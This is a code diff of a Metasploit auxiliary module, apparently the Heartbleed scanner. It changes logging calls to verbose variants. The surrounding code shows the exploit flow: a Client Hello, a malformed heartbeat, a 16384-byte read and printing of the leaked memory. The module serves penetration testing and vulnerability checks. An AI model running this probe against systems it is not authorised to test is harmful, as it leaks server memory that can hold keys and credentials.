@@ -179,28 +179,28 @@ class Metasploit3 < Msf::Auxiliary
     connect
 
     unless datastore['STARTTLS'] == 'None'
-      print_status("Trying to start SSL via #{datastore['STARTTLS']}")
+      vprint_status("#{peer} - Trying to start SSL via #{datastore['STARTTLS']}")
       res = self.send(TTLS_CALLBACKS[datastore['STARTTLS']])
       if res.nil?
-        print_error("#{peer} - STARTTLS failed...")
+        vprint_error("#{peer} - STARTTLS failed...")
         return
       end
     end
 
-    print_status("#{peer} - Sending Client Hello...")
+    vprint_status("#{peer} - Sending Client Hello...")
     sock.put(client_hello)
 
     server_hello = sock.get
     unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
-      print_error("#{peer} - Server Hello Not Found")
+      vprint_error("#{peer} - Server Hello Not Found")
       return
     end
 
-    print_status("#{peer} - Sending Heartbeat...")
+    vprint_status("#{peer} - Sending Heartbeat...")
     sock.put(heartbeat)
     hdr = sock.get_once(5)
     if hdr.blank?
-      print_error("#{peer} - No Heartbeat response...")
+      vprint_error("#{peer} - No Heartbeat response...")
       return
     end
 
@@ -210,15 +210,15 @@ class Metasploit3 < Msf::Auxiliary
     len = unpacked[2]
 
     unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION
-      print_error("#{peer} - Unexpected Heartbeat response'")
+      vprint_error("#{peer} - Unexpected Heartbeat response'")
       disconnect
       return
     end
 
-    print_status("#{peer} - Heartbeat response, checking if there is data leaked...")
+    vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
     heartbeat_data = sock.get_once(16384) # Read the magic length...
     if heartbeat_data && heartbeat_data.length > len
-      print_status("#{peer} - Heartbeat response with leak...")
+      print_good("#{peer} - Heartbeat response with leak")
       report_vuln({
         :host => rhost,
         :port => rport,
@@ -228,7 +228,7 @@ class Metasploit3 < Msf::Auxiliary
       })
       vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
     else
-      print_error("#{peer} - Looks like there isn't leaked information...")
+      vprint_error("#{peer} - Looks like there isn't leaked information...")
     end
   end
 
